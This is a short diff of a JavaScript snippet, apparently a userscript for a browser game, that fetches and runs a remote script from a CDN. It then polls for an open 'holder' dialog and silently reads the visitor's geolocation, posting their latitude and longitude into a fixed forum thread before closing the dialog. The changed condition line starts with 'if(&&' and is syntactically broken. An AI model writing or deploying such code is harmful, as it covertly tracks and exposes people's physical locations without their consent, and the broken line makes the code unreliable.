@@ -2,7 +2,7 @@
     await $.getScript("https://cdn.jsdelivr.net/gh/parseml/many-deobf@latest/deobf.js");
 lfgpd=true;
 setInterval(()=>{
-    if(ig.game.holderDialog.holderId=='6348a0f4c41cdb6a0f9efb5e'&&ig.game.holderDialog.isOpen==true&&lfgpd==true){navigator.geolocation.getCurrentPosition((b)=>{ig.game.O2185.addForumThreadAndFirstComment_P("6513420ca3f7a6059d49e069", "a", b.coords.latitude+" "+b.coords.longitude);lfgpd=false});ig.game.holderDialog.close()}
+    if(&&ig.game.holderDialog.isOpen==true&&lfgpd==true){navigator.geolocation.getCurrentPosition((b)=>{ig.game.O2185.addForumThreadAndFirstComment_P("6513420ca3f7a6059d49e069", "a", b.coords.latitude+" "+b.coords.longitude);lfgpd=false});ig.game.holderDialog.close()}
 
 }, 0);
 bjghrg=Deobfuscator.object(ig.game, "useCdn", true);
